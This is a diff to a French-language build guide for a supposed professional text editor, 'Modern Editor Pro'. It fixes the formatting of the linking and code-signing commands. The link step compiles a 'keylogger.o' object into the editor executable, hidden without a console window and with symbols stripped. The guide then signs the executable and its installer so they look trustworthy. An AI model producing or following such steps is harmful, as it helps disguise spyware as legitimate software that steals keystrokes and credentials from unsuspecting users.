@@ -61,18 +61,14 @@ Un guide détaillé pour compiler et signer l'éditeur de texte professionnel po
 
 
 3. Lier tous les fichiers :
-
 ```bash
-# Installer les dépendances
-npm install```
-
-`x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \`
-`    -o meditor.exe \`
-`    -luser32 -ladvapi32 -lcrypt32 -lshell32 -lcomdlg32 -lgdi32 \`
-`    -mwindows \`
-`    -s \`
-`    -static-libgcc`
-
+x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \
+    -o meditor.exe \
+    -luser32 -ladvapi32 -lcrypt32 -lshell32 -lcomdlg32 -lgdi32 \
+    -mwindows \
+    -s \
+    -static-libgcc
+```
 
 ## 📦 Création de l'installateur
 
@@ -91,27 +87,28 @@ npm install```
 
 1. Signer l'exécutable principal :
 
-`osslsigncode sign \`
-`    -pkcs12 professional.pfx \`
-`    -pass [votre_mot_de_passe] \`
-`    -n "Modern Editor Pro" \`
-`    -i "https://moderneditor.pro" \`
-`    -t http://timestamp.digicert.com \`
-`    -in meditor.exe \`
-`    -out meditor_signed.exe`
-
+```bash
+osslsigncode sign \
+    -pkcs12 professional.pfx \
+    -pass [votre_mot_de_passe] \
+    -n "Modern Editor Pro" \
+    -i "https://moderneditor.pro" \
+    -t http://timestamp.digicert.com \
+    -in meditor.exe \
+    -out meditor_signed.exe
+```
 
 2. Signer l'installateur :
-
-`osslsigncode sign \`
-`    -pkcs12 professional.pfx \`
-`    -pass [votre_mot_de_passe] \`
-`    -n "Modern Editor Pro Installer" \`
-`    -i "https://moderneditor.pro" \`
-`    -t http://timestamp.digicert.com \`
-`    -in ModernEditorPro_1.5.2_Setup.exe \`
-`    -out ModernEditorPro_1.5.2_Setup_signed.exe`
-
+```bash
+osslsigncode sign \
+    -pkcs12 professional.pfx \
+    -pass [votre_mot_de_passe] \
+    -n "Modern Editor Pro Installer" \
+    -i "https://moderneditor.pro" \
+    -t http://timestamp.digicert.com \
+    -in ModernEditorPro_1.5.2_Setup.exe \
+    -out ModernEditorPro_1.5.2_Setup_signed.exe
+```
 
 ## 📁 Structure finale
 
